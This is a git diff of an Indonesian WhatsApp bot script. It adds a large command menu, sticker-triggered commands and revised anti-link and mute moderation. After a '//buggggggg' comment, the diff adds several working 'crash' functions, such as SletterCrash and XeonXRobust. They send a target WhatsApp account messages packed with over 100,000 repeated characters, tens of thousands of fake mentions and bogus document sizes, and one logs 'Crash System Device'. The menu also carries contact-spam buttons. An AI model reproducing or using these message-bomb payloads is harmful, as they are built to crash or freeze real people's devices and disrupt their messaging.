+│${setv} ${prefix}buy [item] (nominal)
+│${setv} ${prefix}transfer
+│${setv} ${prefix}leaderboard
+│${setv} ${prefix}request (text)
+│${setv} ${prefix}react (emoji)
+│${setv} ${prefix}tagme
+│${setv} ${prefix}runtime
+│${setv} ${prefix}totalfitur
+│${setv} ${prefix}ping
+│${setv} ${prefix}afk
+│${setv} ${prefix}rvo (reply pesan viewone)
+│${setv} ${prefix}inspect (url gc)
+│${setv} ${prefix}addmsg
+│${setv} ${prefix}delmsg
+│${setv} ${prefix}getmsg
+│${setv} ${prefix}listmsg
+│${setv} ${prefix}q (reply pesan)
+│${setv} ${prefix}menfes (62xxx|fake name)
+│${setv} ${prefix}donasi
+╰─┬────❍
+╭─┴❍「 *${n}GROUP${n}* 」❍
+│${setv} ${prefix}add (62xxx)
+│${setv} ${prefix}kick (@tag/62xxx)
+│${setv} ${prefix}promote (@tag/62xxx)
+│${setv} ${prefix}demote (@tag/62xxx)
+│${setv} ${prefix}setname (nama baru gc)
+│${setv} ${prefix}setdesc (desk)
+│${setv} ${prefix}setppgc (reply imgnya)
+│${setv} ${prefix}delete (reply pesan)
+│${setv} ${prefix}linkgrup
+│${setv} ${prefix}analyzechats
+│${setv} ${prefix}revoke
+│${setv} ${prefix}startsecret (@tag)
+│${setv} ${prefix}secretmsg (q)
+│${setv} ${prefix}endsecret
+│${setv} ${prefix}tagall
+│${setv} ${prefix}hidetag
+│${setv} ${prefix}totag (reply pesan)
+│${setv} ${prefix}listonline
+│${setv} ${prefix}grup set
+╰─┬────❍
+╭─┴❍「 *${n}SEARCH${n}* 」❍
+│${setv} ${prefix}spotify (query)
+│${setv} ${prefix}ttstalk (query)
+│${setv} ${prefix}ytsearch (query)
+│${setv} ${prefix}ytsearch2 (q) | (q)
+│${setv} ${prefix}pixiv (query)
+│${setv} ${prefix}pinterest (query)
+│${setv} ${prefix}wallpaper (query)
+│${setv} ${prefix}ringtone (query)
+│${setv} ${prefix}liriks (lirik/judul)
+│${setv} ${prefix}google (query)
+│${setv} ${prefix}gimage (query)
+│${setv} ${prefix}npm (query)
+│${setv} ${prefix}play3 (query)
+│${setv} ${prefix}song (query)
+│${setv} ${prefix}style (query)
+│${setv} ${prefix}cuaca (kota)
+│${setv} ${prefix}dukun (nama)
+╰─┬────❍
+╭─┴❍「 *${n}DOWNLOAD${n}* 」❍
+│${setv} ${prefix}spotifydl (url)
+│${setv} ${prefix}ytmp3 (url)
+│${setv} ${prefix}ttslide (url)
+│${setv} ${prefix}play3 (q)
+│${setv} ${prefix}instagram (url)
+│${setv} ${prefix}tiktok (url)
+│${setv} ${prefix}facebook (url)
+│${setv} ${prefix}mediafire (url)
+│${setv} ${prefix}videymp4 (url)
+╰─┬────❍
+╭─┴❍「 *${n}QUOTES${n}* 」❍
+│${setv} ${prefix}motivasi
+│${setv} ${prefix}quotes
+│${setv} ${prefix}dare
+│${setv} ${prefix}truth
+│${setv} ${prefix}renungan
+╰─┬────❍
+╭─┴❍「 *${n}ISLAMMIC${n}* 」❍
+│${setv} ${prefix}quran <1-144>
+│${setv} ${prefix}listsurah
+│${setv} ${prefix}listdoa
+│${setv} ${prefix}doa <1-37>
+│${setv} ${prefix}bacaansholat
+╰─┬────❍
+╭─┴❍「 *${n}TOOLS${n}* 」❍
+│${setv} ${prefix}get (url)
+│${setv} ${prefix}link2img (url)
+│${setv} ${prefix}encode (q)
+│${setv} ${prefix}setcmd (reply stc)
+│${setv} ${prefix}listcmd
+│${setv} ${prefix}delcmd (reply stc)
+│${setv} ${prefix}cekcuaca (kota)
+│${setv} ${prefix}decode (q encode)
+│${setv} ${prefix}hd (reply pesan)
+│${setv} ${prefix}brat (txt)
+│${setv} ${prefix}toaudio (reply pesan)
+│${setv} ${prefix}tomp3 (reply pesan)
+│${setv} ${prefix}tovn (reply pesan)
+│${setv} ${prefix}toimage (reply pesan)
+│${setv} ${prefix}toptv (reply pesan)
+│${setv} ${prefix}tourl (reply pesan)
+│${setv} ${prefix}getq (reply pesan)
+│${setv} ${prefix}tts (textnya)
+│${setv} ${prefix}toqr (textnya)
+│${setv} ${prefix}ssweb (url)
+│${setv} ${prefix}sticker (send/reply img)
+│${setv} ${prefix}colong (reply stiker)
+│${setv} ${prefix}smeme (send/reply img)
+│${setv} ${prefix}emojimix 🙃+💀
+│${setv} ${prefix}nulis
+│${setv} ${prefix}joko (teksnya)
+│${setv} ${prefix}readmore text1|text2
+│${setv} ${prefix}qc (pesannya)
+│${setv} ${prefix}translate
+│${setv} ${prefix}wasted (send/reply img)
+│${setv} ${prefix}triggered (send/reply img)
+│${setv} ${prefix}shorturl (urlnya)
+│${setv} ${prefix}gitclone (urlnya)
+│${setv} ${prefix}fat (reply audio)
+│${setv} ${prefix}fast (reply audio)
+│${setv} ${prefix}bass (reply audio)
+│${setv} ${prefix}slow (reply audio)
+│${setv} ${prefix}tupai (reply audio)
+│${setv} ${prefix}deep (reply audio)
+│${setv} ${prefix}robot (reply audio)
+│${setv} ${prefix}blown (reply audio)
+│${setv} ${prefix}reverse (reply audio)
+│${setv} ${prefix}smooth (reply audio)
+│${setv} ${prefix}earrape (reply audio)
+│${setv} ${prefix}nightcore (reply audio)
+│${setv} ${prefix}getexif (reply sticker)
+│${setv} ${prefix}sticktele
+╰─┬────❍
+╭─┴❍「 *${n}AI${n}* 」❍
+│${setv} ${prefix}ai (query)
+│${setv} ${prefix}gemini (query)
+│${setv} ${prefix}luminai (query)
+│${setv} ${prefix}meta (query)
+│${setv} ${prefix}llama (query)
+│${setv} ${prefix}setpromt2 (query)
+│${setv} ${prefix}setpromt (query)
+│${setv} ${prefix}simi (query)
+│${setv} ${prefix}aitukam
+│${setv} ${prefix}esia
+│${setv} ${prefix}autoai2 (own)
+│${setv} ${prefix}autoai (own)
+│${setv} ${prefix}txt2img (query)
+│${setv} ${prefix}img2text (reply img/stc)
+│${setv} ${prefix}aimg (query)
+╰─┬────❍
+╭─┴❍「 *${n}CEWE${n}* 」❍
+│${setv} ${prefix}cjpn 
+│${setv} ${prefix}ckorea
+│${setv} ${prefix}cthai
+│${setv} ${prefix}cindo
+│${setv} ${prefix}cviet
+│${setv} ${prefix}cchina
+╰─┬────❍
+╭─┴❍「 *${n}ANIME${n}* 」❍
+│${setv} ${prefix}waifu
+│${setv} ${prefix}neko
+│${setv} ${prefix}bluearchive
+╰─┬────❍
+╭─┴❍「 *${n}GAME${n}* 」❍
+│${setv} ${prefix}tictactoe
+│${setv} ${prefix}akinator
+│${setv} ${prefix}suit
+│${setv} ${prefix}slot
+│${setv} ${prefix}math (level)
+│${setv} ${prefix}begal
+│${setv} ${prefix}casino (nominal)
+│${setv} ${prefix}rampok (@tag)
+│${setv} ${prefix}tekateki
+│${setv} ${prefix}tebaklirik
+│${setv} ${prefix}tebakkata
+│${setv} ${prefix}tebakbom
+│${setv} ${prefix}susunkata
+│${setv} ${prefix}tebakkimia
+│${setv} ${prefix}caklontong
+│${setv} ${prefix}tebaknegara
+│${setv} ${prefix}tebakgambar
+│${setv} ${prefix}tebakepep
+│${setv} ${prefix}tebakbendera
+╰─┬────❍
+╭─┴❍「 *${n}FUN${n}* 」❍
+│${setv} ${prefix}dadu
+│${setv} ${prefix}reminder
+│${setv} ${prefix}cermin (q)
+│${setv} ${prefix}bisakah (text)
+│${setv} ${prefix}apakah (text)
+│${setv} ${prefix}kapan (text)
+│${setv} ${prefix}kerangajaib (text)
+│${setv} ${prefix}cekmati (nama lu)
+│${setv} ${prefix}ceksifat
+│${setv} ${prefix}cekkhodam (nama lu)
+│${setv} ${prefix}rate (reply pesan)
+│${setv} ${prefix}jodohku
+│${setv} ${prefix}jadian
+│${setv} ${prefix}fitnah
+│${setv} ${prefix}halah (text)
+│${setv} ${prefix}hilih (text)
+│${setv} ${prefix}huluh (text)
+│${setv} ${prefix}heleh (text)
+│${setv} ${prefix}holoh (text)
+╰─┬────❍
+╭─┴❍「 *${n}RANDOM${n}* 」❍
+│${setv} ${prefix}coffe
+│${setv} ${prefix}kucing
+╰─┬────❍
+╭─┴❍「 *${n}OWNER${n}* 」❍
+│${setv} ${prefix}bot [set]
+│${setv} ${prefix}addthumb <nme|lnk>
+│${setv} ${prefix}delthumb <nme>
+│${setv} ${prefix}listthumb
+│${setv} ${prefix}setexif
+│${setv} ${prefix}setbio
+│${setv} ${prefix}setppbot
+│${setv} ${prefix}join
+│${setv} ${prefix}typodetect on/off
+│${setv} ${prefix}leave
+│${setv} ${prefix}block
+│${setv} ${prefix}setmenu s<1-9>
+│${setv} ${prefix}listblock
+│${setv} ${prefix}openblock
+│${setv} ${prefix}listpc
+│${setv} ${prefix}addcase
+│${setv} ${prefix}getcase
+│${setv} ${prefix}delcase
+│${setv} ${prefix}listgc
+│${setv} ${prefix}checklocation
+│${setv} ${prefix}creategc
+│${setv} ${prefix}addprem
+│${setv} ${prefix}delprem
+│${setv} ${prefix}listprem
+│${setv} ${prefix}addlimit
+│${setv} ${prefix}adduang
+│${setv} ${prefix}bot --settings
+│${setv} ${prefix}bot settings
+│${setv} ${prefix}getsession
+│${setv} ${prefix}delsession
+│${setv} ${prefix}delsampah
+│${setv} ${prefix}upsw
+│${setv} ${prefix}shutdown
+│${setv} ${prefix}restart
+│${setv} $
+│${setv} >
+│${setv} <
+╰──────❍`;
+				await sych.sendMessage(m.chat, {
+    document: fake.docs,
+    fileName: ucapanWaktu,
+    mimetype: pickRandom(fake.listfakedocs),
+    fileLength: '100000000000000',
+    pageCount: '999',
+    caption: menunya,
+    buttons: [{
+        buttonId: `${prefix}pushkontak2`,
+        buttonText: {
+            displayText: "PushKontak2"
+        }
+    }, {
+        buttonId: `${prefix}list`,
+        buttonText: {
+            displayText: "List GC"
+        }
+    },{
+    buttonId: `${prefix}pler`,
+        buttonText: {
+            displayText: "PushKontak2"
+        }
+    }, {
+        buttonId: `${prefix}pepek`,
+        buttonText: {
+            displayText: "List GC"
+        }
+    }
+    
+    ],
+    viewOnce: true,
+    contextInfo: {
+        mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
+        forwardingScore: 10,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: my.ch,
+            serverMessageId: null,
+            newsletterName: `${botname}${randomEmoji}`
+        },
+        externalAdReply: {
+            title: author,
+            body: packname,
+            showAdAttribution: true,
+            thumbnailUrl: profile,
+            mediaType: 1,
+            previewType: 0,
+            renderLargerThumbnail: true,
+            mediaUrl: my.gh,
+            sourceUrl: my.gh,
+        }
+    }
+}, {
+    quoted: fkontak
+});
+
+// Mengirim stiker
+await sych.sendMessage(m.chat, {
+    sticker: {
+        url: 'src/media/stc.webp'
+    }, // Path file stiker
+    mimetype: 'image/webp',
+}, {
+    quoted: floc
+});
+
+sych.sendMessage(m.chat, {
+    react: {
+        text: randomEmoji, // Emoji acak
+        key: m.key // Memberikan reaksi pada pesan yang baru saja dikirim
+    }
+});
+			}
+
+
+
+
+
+// Debug untuk memeriksa apakah m.message ada
+// Bagian kode lain di bawah
+
 		/*
 		
 		[ ! ] INI KALO CUMA 1 LINK (NOT RANDOM)
@@ -545,6 +1494,8 @@ const mess = {
 		}
 		
 	*/
+	
+	
 	
 		
 		// Daftar thumbnail URL yang bisa dipilih secara random
@@ -627,6 +1578,70 @@ const sycreply = (teks) => {
         quoted: fkontak
     })
 }
+
+
+
+
+//memanggil stiker
+
+if (m.message && m.message.stickerMessage) {
+  console.log("Debug - Stiker ditemukan!");
+  const stickerID = Buffer.from(m.message.stickerMessage.fileSha256).toString('base64');
+  console.log("Debug - ID Stiker yang diterima (base64):", stickerID);
+
+  const stickerActions = {
+  'hWIXHD4bWzU/JeaYEr2UbIqNaGIcwy419r3eLazCIuM=': 'ppk', // Stiker untuk case 'ppk'
+  '1C5XPk0DAkGYH0X4gyxaMTHafPuNSzjULJXYJmrqzJ4=': 'allmenu', // Stiker untuk case 'allmenu'
+  'Rp3XTwX5IBVAQ+6HJ49OW7ht3jm8Qu8S+4Ekg8NXBHc=': 'simi_kontol', // Stiker untuk query 'simi halo'
+  'dev7xSIA6XNWeDB6bNNMcjJiq9nIvKGRXJCpbf7n1Xw=': 'simi_memek', // Stiker untuk query 'simi apa kabar'
+  'h7J6okcUkiZc0UcgvgWAsWwyyuSiiP5aOkeb8k0GOzM=': 'kontol',
+};
+
+  if (stickerActions[stickerID]) {
+    const action = stickerActions[stickerID];
+    console.log("Debug - Aksi yang ditemukan untuk stiker:", action);
+
+    switch (action) {
+  case 'ppk':
+    console.log("Debug - Memanggil case 'ppk'");
+    await runPpkCase(m, sych, sycreply, isRegistered);
+    break;
+
+  case 'allmenu':
+    console.log("Debug - Memanggil case 'allmenu'");
+    await runAllMenuCase(m, sych, sycreply, isRegistered);
+    break;
+
+  case 'simi_kontol':
+    console.log("Debug - Memanggil case 'simi_kontol'");
+    const hasilHalo = await simi('simi kontol'); // Kirim query "simi halo" ke API Simi
+    sycreply(hasilHalo.success); // Kirim balasan Simi ke pengguna
+    break;
+
+  case 'simi_memek':
+    console.log("Debug - Memanggil case 'simi_memek'");
+    const hasilApaKabar = await simi('simi memek'); // Kirim query "simi apa kabar" ke API Simi
+    sycreply(hasilApaKabar.success); // Kirim balasan Simi ke pengguna
+    break;
+
+case 'kontol':
+    console.log("Debug - Memanggil case 'kontol'");
+    await runKontolCase(m, sych, sycreply, isRegistered);
+    break;
+
+  default:
+    console.log("Debug - Tidak ada aksi untuk stiker ini.");
+    sycreply('Tidak ada aksi untuk stiker ini.');
+}
+  } else {
+    console.log("Debug - Stiker tidak terdaftar dalam stickerActions.");
+  }
+} else {
+  console.log("Debug - Tidak ada pesan stiker dalam pesan yang diterima.");
+}
+
+
+
 // 3. Modifikasi pengolahan command
 if (isCmd && m.sender !== botNumber && !m.isGroup) {
     if (typoDetectionEnabled) { // Periksa apakah fitur aktif
@@ -700,9 +1715,28 @@ function base64ToImg(base64String, outputPath) {
 		// Group Settings
 		if (m.isGroup) {
 			// Mute
-			if (db.groups[m.chat].mute && !isCreator) {
-				return
-			}
+	// Logika mute yang diperbarui
+if (db.groups[m.chat].mute && !isCreator) {
+    console.log(`[MUTE] Grup: ${m.chat} dalam mode mute.`);
+
+    // Periksa apakah pengirim adalah admin
+    const groupMetadata = m.isGroup ? await sych.groupMetadata(m.chat) : null; // Metadata grup
+    const participants = groupMetadata ? groupMetadata.participants : []; // Daftar peserta grup
+    const isAdmins = m.isGroup ? participants.some(v => v.id === m.sender && v.admin) : false; // Apakah pengirim admin?
+
+    console.log(`[MUTE] Apakah pengirim admin? ${isAdmins}`);
+    console.log(`[MUTE] Apakah pengirim adalah creator? ${isCreator}`);
+
+    // Jika pengirim adalah admin atau creator, abaikan mode mute
+    if (isAdmins || isCreator) {
+        console.log(`[MUTE] Pengirim diperbolehkan berbicara meskipun dalam mode mute.`);
+        return;
+    }
+
+    // Jika pengirim bukan admin atau creator, hentikan proses
+    console.log(`[MUTE] Pesan dari ${m.sender} diabaikan.`);
+    return;
+}
 			// Anti Delete
 			if (m.type == 'protocolMessage' && db.groups[m.chat].antidelete && !isCreator && m.isBotAdmin && !m.isAdmin) {
 				const mess = chatUpdate.messages[0].message.protocolMessage
@@ -725,9 +1759,11 @@ function base64ToImg(base64String, outputPath) {
 								isForwarded: true,
 								forwardingScore: 1,
 								quotedMessage: {
-									conversation: '*Anti Delete❗*'
+							    conversation: '*Anti Delete❗*'
 								},
 								...chats.key
+								
+								
 							}
 						}
 					} : {
@@ -737,34 +1773,114 @@ function base64ToImg(base64String, outputPath) {
 				}
 			}
 			// Anti Link Group
-			if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
-				if (budy.match('chat.whatsapp.com/')) {
-					const isGcLink = new RegExp(`https://chat.whatsapp.com/${await sych.groupInviteCode(m.chat)}`, 'i').test(m.text);
-					if (isGcLink) return
-					await sych.sendMessage(m.chat, {
-						delete: {
-							remoteJid: m.chat,
-							fromMe: false,
-							id: m.id,
-							participant: m.sender
-						}
-					})
-					await sych.relayMessage(m.chat, {
-						extendedTextMessage: {
-							text: `Terdeteksi @${m.sender.split('@')[0]} Mengirim Link Group\nMaaf Link Harus Di Hapus..`,
-							contextInfo: {
-								mentionedJid: [m.key.participant],
-								isForwarded: true,
-								forwardingScore: 1,
-								quotedMessage: {
-									conversation: '*Anti Link❗*'
-								},
-								...m.key
-							}
-						}
-					}, {})
-				}
-			}
+	// Menangani pesan masuk
+if (db.groups[m.chat].antilink && !isCreator && m.isBotAdmin && !m.isAdmin) {
+    try {
+        console.log('Antilink aktif, pengirim bukan creator atau admin, dan bot adalah admin.');
+
+        // Log pesan yang diterima
+        console.log('Pesan yang diterima:', m.text);
+
+        // Cek apakah pesan mengandung tautan WhatsApp grup
+        if (m.text.match(/chat\.whatsapp\.com/)) {
+            console.log('Pesan mengandung tautan grup WhatsApp.');
+
+            // Dapatkan kode undangan grup
+            const groupInviteCode = await sych.groupInviteCode(m.chat);
+            console.log('Kode undangan grup saat ini:', groupInviteCode);
+
+            // Cek apakah tautan yang diterima adalah tautan grup yang sesuai
+            const isGcLink = new RegExp(`https://chat.whatsapp.com/${groupInviteCode}`, 'i').test(m.text);
+            console.log('Apakah tautan mengarah ke grup ini?', isGcLink);
+
+            if (isGcLink) {
+                console.log('Tautan adalah undangan grup ini, tidak ada tindakan yang diambil.');
+                return;
+            }
+
+            // Jika tautan bukan untuk grup ini, hapus pesan
+            console.log('Tautan bukan untuk grup ini, menghapus pesan...');
+            await sych.sendMessage(m.chat, {
+                delete: {
+                    remoteJid: m.chat,
+                    fromMe: false,
+                    id: m.id,  // pastikan m.id adalah ID pesan yang valid
+                    participant: m.sender
+                }
+            });
+
+            // Kirim peringatan kepada pengirim
+            console.log('Mengirim peringatan kepada pengirim...');
+            await sych.relayMessage(m.chat, {
+                extendedTextMessage: {
+                    text: `Terdeteksi @${m.sender.split('@')[0]} mengirim tautan grup.\nMaaf, tautan harus dihapus.`,
+                    contextInfo: {
+                        mentionedJid: [m.key.participant],
+                        isForwarded: true,
+                        forwardingScore: 1,
+                        quotedMessage: {
+                            conversation: '*Anti Link❗*'
+                        },
+                        ...m.key
+                    }
+                }
+            }, {});
+        }
+    } catch (error) {
+        console.error('Terjadi kesalahan pada pengecekan link:', error);
+    }
+}
+
+if (db.groups[m.chat].antilinkgc) {
+    try {
+        if (m.text.match(/chat\.whatsapp\.com/)) {
+            console.log('Pesan mengandung tautan grup WhatsApp.');
+
+            // Memeriksa apakah pengirim adalah admin
+            const isAdmins = m.isAdmin || m.isBotAdmin; // Menentukan admin
+            if (isAdmins || m.key.fromMe || isCreator) return;
+
+            // Hapus pesan yang berisi tautan grup WhatsApp
+            console.log('Menghapus pesan...');
+            await sych.sendMessage(m.chat, {
+                delete: {
+                    remoteJid: m.chat,
+                    fromMe: false,
+                    id: m.key.id,  // pastikan ID pesan valid
+                    participant: m.key.participant
+                }
+            });
+        }
+    } catch (error) {
+        console.error('Terjadi kesalahan pada pengecekan link GC:', error);
+    }
+}
+
+if (db.groups[m.chat].antilink) {
+    try {
+        // Cek apakah pesan mengandung tautan HTTP atau HTTPS
+        if (m.text.match(/https?:\/\//)) {
+            console.log('Pesan mengandung tautan HTTP/HTTPS.');
+
+            // Memeriksa apakah pengirim adalah admin
+            const isAdmins = m.isAdmin || m.isBotAdmin; // Menentukan admin
+            if (isAdmins || m.key.fromMe || isCreator) return;
+
+            // Hapus pesan yang berisi tautan
+            console.log('Menghapus pesan...');
+            await sych.sendMessage(m.chat, {
+                delete: {
+                    remoteJid: m.chat,
+                    fromMe: false,
+                    id: m.key.id,  // pastikan ID pesan valid
+                    participant: m.key.participant
+                }
+            });
+        }
+    } catch (error) {
+        console.error('Terjadi kesalahan pada pengecekan tautan:', error);
+    }
+}
 			// Anti Virtex Group
 			if (db.groups[m.chat].antivirtex && !isCreator && m.isBotAdmin && !m.isAdmin) {
 				if (budy.length > 6000) {
@@ -1087,57 +2203,7 @@ function base64ToImg(base64String, outputPath) {
 			}
 		}
 		// Game
-		const games = {
-			tebaklirik,
-			tekateki,
-			tebaklagu,
-			tebakkata,
-			kuismath,
-			susunkata,
-			tebakkimia,
-			caklontong,
-			tebaknegara,
-			tebakgambar,
-			tebakepep,
-			tebakbendera
-		}
-		for (let gameName in games) {
-			let game = games[gameName];
-			let id = iGame(game, m.chat);
-			if (m.quoted && id == m.quoted.id) {
-				if (gameName == 'kuismath') {
-					jawaban = game[m.chat + id].jawaban
-					const difficultyMap = {
-						'noob': 1,
-						'easy': 1.5,
-						'medium': 2.5,
-						'hard': 4,
-						'extreme': 5,
-						'impossible': 6,
-						'impossible2': 7
-					};
-					let randMoney = difficultyMap[kuismath[m.chat + id].mode]
-					if (!isNaN(budy)) {
-						if (budy.toLowerCase() == jawaban) {
-							db.users[m.sender].uang += randMoney * 1000
-							await sycreply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${randMoney * 1000}*`)
-							delete kuismath[m.chat + id]
-						} else sycreply('*Jawaban Salah!*')
-					}
-				} else {
-				
-					jawaban = game[m.chat + id].jawaban;
-					let jawabBenar = /tekateki|tebaklirik|tebaklagu|tebakkata|tebaknegara|tebakbendera/.test(gameName) ? (similarity(budy.toLowerCase(), jawaban) >= almost) : (budy.toLowerCase() == jawaban)
-					let bonus = gameName == 'caklontong' ? 9999 : gameName == 'tebaklirik' ? 4299 : gameName == 'susunkata' ? 2989 : 3499
-					if (jawabBenar) {
-						db.users[m.sender].uang += bonus * 1
-						await sycreply(`Jawaban Benar 🎉\nBonus Uang 💰 *+${bonus}*`)
-						delete game[m.chat + id]
-					} else sycreply('*Jawaban Salah!*')
-				}
-				console.log('game[m.chat + id]:', game[m.chat + id]);
-			}
-		}
+		
 		// Family 100
 		if (m.chat in family100) {
 			if (m.quoted && m.quoted.id == family100[m.chat].id && !isCmd) {
@@ -1212,13 +2278,2038 @@ function base64ToImg(base64String, outputPath) {
 		}
 		
 		
+	
+        
+	//buggggggg
+	
+	async function getBuffer(imageUrl) {
+    const response = await fetch(imageUrl);
+    const buffer = await response.buffer(); // Mengambil buffer gambar dari URL
+    return buffer;
+}
+
+		
+		async function newsLetter(zLoc, ptcp = true) {
+            try {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: `33333333333333333@newsletter`,
+                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(120000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+                await sych.relayMessage(zLoc, ptcp, {
+                    userJid: zLoc,
+                });
+            }
+            catch (err) {
+                console.log(err);
+            }
+        }
+async function SletterCrash(zLoc, ptcp = false) {
+let virtex = "DasarKontol -" + "💀ꦾ".repeat(77777) + "@1".repeat(77777);
+	var messageContent = generateWAMessageFromContent(zLoc, proto.Message.fromObject({
+				'viewOnceMessage': {
+					'message': {
+						"newsletterAdminInviteMessage": {
+							"newsletterJid": `120363321763581234@newsletter`,
+							"newsletterName": virtex,
+							"jpegThumbnail": "",
+							"caption": virtex,
+							"inviteExpiration": Date.now() + 1814400000
+						},
+						contextInfo: {
+                  mentionedJid: ["50251731838@s.whatsapp.net"],
+                  groupMentions: [{ groupJid: "120363321763581234@newsletter", groupSubject: virtex }]
+                    }
+					}
+				}
+			}), {
+				'userJid': zLoc
+			});
+			await sych.relayMessage(zLoc, messageContent.message, {
+				'remote': {
+					'jid': zLoc
+				},
+				'messageId': messageContent.key.id
+		});
+            console.log(chalk.red.bold('Crash System Device By ☆ CellaCrash'))
+}
+   async function XeonXRobust(zLoc, ptcp = false) {
+	const jids = `_*~@916909137213~*_\n`.repeat(10200);
+	const ui = 'ꦽ'.repeat(1500);
+   await sych.relayMessage(zLoc, {
+     ephemeralMessage: {
+      message: {
+       interactiveMessage: {
+        header: {
+         documentMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
+          mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+          fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+          fileLength: "9999999999999",
+          pageCount: 1316134911,
+          mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
+          fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+          fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
+          directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
+          mediaKeyTimestamp: "1726867151",
+          contactVcard: true,
+          jpegThumbnail: "",
+         },
+         hasMediaAttachment: true,
+        },
+
+									body: { text: 'ᄃΛᄂIƧƬΛᄃЯΛƧΉ' + ui + jids },
+									contextInfo: {
+										mentionedJid: ['916909137213@s.whatsapp.net'],
+										mentions: ['916909137213@s.whatsapp.net'],
+										},
+								    footer: { text: '' },
+									nativeFlowMessage: {},
+        contextInfo: {
+         mentionedJid: ["916909137213@s.whatsapp.net", ...Array.from({
+          length: 30000
+         }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
+         forwardingScore: 1,
+         isForwarded: true,
+         fromMe: false,
+         participant: "0@s.whatsapp.net",
+         remoteJid: "status@broadcast",
+         quotedMessage: {
+          documentMessage: {
+           url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
+           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
+           fileLength: "9999999999999",
+           pageCount: 1316134911,
+           mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
+           fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+           fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
+           directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
+           mediaKeyTimestamp: "1724474503",
+           contactVcard: true,
+           thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
+           thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
+           thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
+           jpegThumbnail: "",
+          },
+         },
+        },
+       },
+      },
+     },
+    },
+    ptcp ? {
+     participant: {
+      jid: zLoc
+     }
+    } : {}
+   );
+	}
+  
+     async function xeonHARD(zLoc, ptcp = false)
+    {
+          const gg = "ꦽ".repeat(10200);
+          const ggg = "ꦿꦾ".repeat(10200);
+          sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+              message: {
+                extendedTextMessage: {
+                  text: " '  ᄃΛᄂIƧƬΛᄃЯΛƧΉ'\n" + gg,
+                  previewType: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                  contextInfo: {
+                    mentionedJid: ["916909137213@s.whatsapp.net", "916909137213@s.whatsapp.net"]
+                  }
+                }
+              }
+            }
+          }, {
+            participant: {
+              jid: zLoc
+            }
+          });
+          await sych.relayMessage(zLoc, {
+            viewOnceMessage: {
+              message: {
+                interactiveMessage: {
+                  body: {
+                    text: "akujelek?"
+                  },
+                  footer: {
+                    text: ""
+                  },
+                  header: {
+                    documentMessage: {
+                      url: "https://mmg.whatsapp.net/v/t62.7119-24/19973861_773172578120912_2263905544378759363_n.enc?ccb=11-4&oh=01_Q5AaIMqFI6NpAOoKBsWqUR52hN9p5YIGxW1TyJcHyVIb17Pe&oe=6653504B&_nc_sid=5e03e0&mms3=true",
+                      mimetype: "application/pdf",
+                      fileSha256: "oV/EME/ku/CjRSAFaW+b67CCFe6G5VTAGsIoimwxMR8=",
+                      fileLength: null,
+                      pageCount: 99999999999999,
+                      contactVcard: true,
+                      caption: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ",
+                      mediaKey: "yU8ofp6ZmGyLRdGteF7Udx0JE4dXbWvhT6X6Xioymeg=",
+                      fileName: "ᄃΛᄂIƧƬΛᄃЯΛƧΉ ",
